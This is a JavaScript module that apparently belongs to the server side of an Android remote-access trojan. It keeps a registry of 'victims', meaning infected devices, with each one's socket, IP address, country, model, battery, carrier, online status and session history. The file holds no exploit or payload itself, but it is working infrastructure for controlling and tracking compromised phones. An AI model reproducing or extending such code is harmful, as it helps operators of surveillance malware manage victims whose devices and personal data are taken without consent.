var Victim = function(socket, ip, port, country, manf, model, release, extra) {
    this.socket = socket;
    this.ip = ip;
    this.port = port;
    this.country = country;
    this.manf = manf;
    this.model = model;
    this.release = release;
    // Extra device info
    extra = extra || {};
    this.sdk = extra.sdk || '';
    this.battery = extra.battery !== undefined ? parseInt(extra.battery) : -1;
    this.operator = extra.operator || '';
    this.device = extra.device || '';
    this.brand = extra.brand || '';
    this.product = extra.product || '';
    this.connectedAt = Date.now();
    this.lastSeen = Date.now();
    this.isOnline = true;
    this.totalConnections = 1;
    this.sessionDuration = 0;
};


class Victims {
    constructor() {
        this.victimList = {};
        this.offlineList = {}; // Keep track of offline victims
        this.instance = this;
    }

    addVictim(socket, ip, port, country, manf, model, release, id, extra) {
        // Check if victim was previously offline
        if (this.offlineList[id]) {
            // Restore from offline and update
            var victim = this.offlineList[id];
            victim.socket = socket;
            victim.ip = ip;
            victim.port = port;
            victim.isOnline = true;
            victim.lastSeen = Date.now();
            victim.totalConnections++;
            Object.assign(victim, extra || {});
            this.victimList[id] = victim;
            delete this.offlineList[id];
        } else {
            var victim = new Victim(socket, ip, port, country, manf, model, release, extra || {});
            this.victimList[id] = victim;
        }
    }
    
    updateVictim(id, updates) {
        if (this.victimList[id]) {
            Object.assign(this.victimList[id], updates);
            this.victimList[id].lastSeen = Date.now();
        }
    }

    getVictim(id) {
        if (this.victimList[id] != null)
            return this.victimList[id];
        if (this.offlineList[id] != null)
            return this.offlineList[id];
        return -1;
    }

    setOffline(id) {
        if (this.victimList[id]) {
            var victim = this.victimList[id];
            victim.isOnline = false;
            victim.socket = null;
            victim.sessionDuration += Date.now() - victim.connectedAt;
            this.offlineList[id] = victim;
            delete this.victimList[id];
        }
    }

    rmVictim(id) {
        delete this.victimList[id];
        delete this.offlineList[id];
    }

    getVictimList() {
        return this.victimList;
    }

    getAllVictims() {
        return { ...this.victimList, ...this.offlineList };
    }

    getOnlineCount() {
        return Object.keys(this.victimList).length;
    }

    getOfflineCount() {
        return Object.keys(this.offlineList).length;
    }

}



module.exports = new Victims();
